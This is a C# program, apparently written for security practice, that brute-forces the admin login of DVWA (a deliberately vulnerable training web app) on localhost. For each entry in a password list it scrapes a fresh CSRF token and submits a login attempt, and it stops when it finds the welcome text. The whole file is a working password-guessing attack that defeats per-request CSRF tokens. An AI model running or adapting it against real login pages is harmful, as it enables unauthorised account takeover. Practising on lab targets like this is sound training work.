﻿using AngleSharp;
using AngleSharp.Dom;

namespace DVWA_BruteForce_HighSecurity
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // TODO: create command line tack statements, allow for generic user input, allow for specific username attempt, cookie input with example, built in / default password list, accept txt or csv or manual password list, help option, verbose option. upload as a nuget pacakge with disclaimer. write blog post. 

            // Initialize AngleSharp settings
            IConfiguration config = Configuration.Default;
            IBrowsingContext context = BrowsingContext.New(config);

            var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
            //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.csv").ToList();

            var cookieContents = "PHPSESSID=nmal50l9m8re9sgnreen7a74e6; security=high";
            var targetBaseAddressURI = "http://localhost:3000/vulnerabilities/brute/";
            var csrfTokenName = "user_token";
            var _username = "admin";

            using (var httpClient = new HttpClient())
            {
                httpClient.BaseAddress = new Uri(targetBaseAddressURI);
                httpClient.DefaultRequestHeaders.Add("Cookie", cookieContents);

                foreach (var _password in passwordList)
                {
                    // Make a GET request to the login page and parse for the CSRF token
                    var loginPageResponseBody = await httpClient.GetStringAsync("");
                    var document = await context.OpenAsync(req => req.Content(loginPageResponseBody));
                    var csrfToken = document.QuerySelector($"input[name='{csrfTokenName}']").GetAttribute("value");

                    if (csrfToken == null || csrfToken.Length == 0)
                    {
                        Console.WriteLine($"Error - CSRF token could not be parsed from login page (attempted password: {_password}");
                        continue;
                    }

                    var loginAttemptResponseBody = await httpClient.GetStringAsync($"?username={_username}&password={_password}&Login=Login&user_token={csrfToken}");

                    if (loginAttemptResponseBody.Contains("Username and/or password incorrect"))
                    {
                        Console.WriteLine($"Incorrect password ({_password}).");
                    }
                    else if (loginAttemptResponseBody.Contains("Welcome to the password protected area admin"))
                    {
                        Console.WriteLine($"Valid password found: {_password}.");
                        break;
                    }
                    else
                    {
                        Console.WriteLine($"Error - Unexpected webpage response received after attempting login (attempted password: {_password}.");
                    }
                }
            }
        }
    }
}